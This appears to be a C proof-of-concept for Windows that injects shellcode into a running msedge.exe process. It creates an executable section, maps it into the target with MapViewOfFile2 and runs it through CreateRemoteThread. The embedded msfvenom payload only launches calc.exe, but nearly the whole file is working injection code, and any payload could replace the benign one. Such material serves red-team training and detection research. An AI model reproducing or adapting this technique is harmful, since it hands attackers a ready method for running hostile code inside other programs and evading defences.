#include <Windows.h>
#include "misc.h"
#include "process-enumeration-ntquerysystemInformation-lib.h"


int main()
{
	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c EXITFUNC=thread
	BYTE pbPayload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	SIZE_T sPayload = (sizeof(pbPayload) / sizeof(BYTE)) - 1;

	HANDLE hFile = NULL;
	HANDLE hThread = NULL;
	PVOID pMap = NULL;
	PVOID pMapRemote = NULL;
	BOOL bRet = FALSE;

	LPCWSTR szProcName = L"msedge.exe";
	DWORD pdwPid[1024] = { 0 };
	HANDLE phProcess[1024] = { 0 };
	DWORD dwProcesses = 1024;

	do {
		wprintf(L"[i] Creating file mapping object... ");
		hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, (DWORD)sPayload, NULL);
		if (hFile == NULL)
		{
			printError(L"CreateFileMappingW");
			break;
		}
		wprintf(L"done, 0x%p\n", hFile);

		wprintf(L"[i] Mapping view of a file mapping object into the address space of a process... ");
		pMap = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayload);
		if (pMap == NULL)
		{
			printError(L"MapViewOfFile");
			break;
		}
		wprintf(L"done, 0x%p\n", pMap);

		wprintf(L"[i] Copying payload... ");
		memcpy(pMap, pbPayload, sPayload);
		wprintf(L"done\n");

		bRet = GetRemoteProcessHandleNtQuerySystemInformation(szProcName, pdwPid, phProcess, &dwProcesses);
		if (!bRet)
		{
			break;
		}

		int idx = 0;

		wprintf(L"[i] Mapping payload to a new remote buffer in the target process (PID: %d)... ", pdwPid[idx]);
		pMapRemote = MapViewOfFile2(hFile, phProcess[idx], NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
		if (pMapRemote == NULL)
		{
			printError(L"MapViewOfFile2");
			break;
		}
		wprintf(L"done, 0x%p\n", pMapRemote);

		wprintf(L"[i] Creating new remote thread and run payload... ");
		hThread = CreateRemoteThread(phProcess[idx], NULL, NULL, (LPTHREAD_START_ROUTINE)pMapRemote, NULL, NULL, NULL);
		if (hThread == NULL)
		{
			printError(L"CreateRemoteThread");
			break;
		}
		wprintf(L"done, 0x%p\n", hThread);

		/*
		WaitForSingleObject(hThread, INFINITE);

		wprintf(L"[i] Unmapping view of file... ");
		bRet = UnmapViewOfFile(pMap);
		if (!bRet)
		{
			printError(L"UnmapViewOfFile");
			break;
		}
		wprintf(L"done\n");
		*/

	} while (FALSE);

	if (hFile)
		CloseHandle(hFile);

	return 0;
}